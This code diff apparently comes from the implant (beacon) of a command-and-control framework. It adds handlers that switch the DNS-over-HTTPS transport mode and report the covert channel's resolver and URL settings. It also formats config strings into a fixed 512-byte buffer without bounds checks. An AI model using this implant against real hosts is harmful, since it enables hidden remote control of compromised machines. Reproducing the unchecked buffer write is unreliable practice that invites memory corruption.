@@ -291,6 +291,66 @@ void Commander::CmdTransport(ULONG commandId, Packer* inPacker, Packer* outPacke
 		outPacker->Pack32(COMMAND_TRANSPORT);
 		outPacker->Pack32(subcommand);
 	}
+	else if (subcommand == 4) {
+		// doh.mode: set DoH connection mode (direct/recursive)
+		ULONG modeSize = 0;
+		CHAR* dohMode = (CHAR*)inPacker->UnpackBytes(&modeSize);
+		ULONG taskId = inPacker->Unpack32();
+
+		#if defined(BEACON_DOH) || defined(BEACON_DNS_DOH)
+		if (dohMode && modeSize > 0) {
+			BYTE* newMode = (BYTE*)MemAllocLocal(modeSize + 1);
+			if (newMode) {
+				memcpy(newMode, dohMode, modeSize);
+				newMode[modeSize] = '\0';
+				// Normalize to lowercase
+				for (ULONG i = 0; i < modeSize; ++i) {
+					if (newMode[i] >= 'A' && newMode[i] <= 'Z')
+						newMode[i] = (BYTE)(newMode[i] - 'A' + 'a');
+				}
+				#if defined(BEACON_DOH)
+				this->agent->config->profile.doh_mode = newMode;
+				#elif defined(BEACON_DNS_DOH)
+				this->agent->config->profile.doh_mode = newMode;
+				this->agent->config->profile.doh.doh_mode = newMode;
+				#endif
+			}
+		}
+		#else
+		UNREFERENCED_PARAMETER(dohMode);
+		#endif
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_TRANSPORT);
+		outPacker->Pack32(subcommand);
+	}
+	else if (subcommand == 5) {
+		// status: return current transport status
+		ULONG taskId = inPacker->Unpack32();
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_TRANSPORT);
+		outPacker->Pack32(subcommand);
+
+		// Build status string
+		#if defined(BEACON_DNS_DOH)
+		CHAR statusBuf[512];
+		CHAR* mode = (CHAR*)this->agent->config->profile.mode;
+		CHAR* dohMode = (CHAR*)this->agent->config->profile.doh_mode;
+		wsprintfA(statusBuf, "Transport Mode: %s\nDoH Mode: %s\nDNS Resolvers: %s\nDoH URLs: %s",
+			mode ? mode : "auto",
+			dohMode ? dohMode : "recursive",
+			this->agent->config->profile.dns.resolvers ? (CHAR*)this->agent->config->profile.dns.resolvers : "(default)",
+			this->agent->config->profile.doh.urls ? (CHAR*)this->agent->config->profile.doh.urls : "(default)");
+		outPacker->PackBytes((BYTE*)statusBuf, lstrlenA(statusBuf));
+		#elif defined(BEACON_DNS)
+		outPacker->PackBytes((BYTE*)"Transport: DNS only", 19);
+		#elif defined(BEACON_DOH)
+		outPacker->PackBytes((BYTE*)"Transport: DoH only", 19);
+		#else
+		outPacker->PackBytes((BYTE*)"Transport: N/A", 14);
+		#endif
+	}
 }
 
 void Commander::CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker)
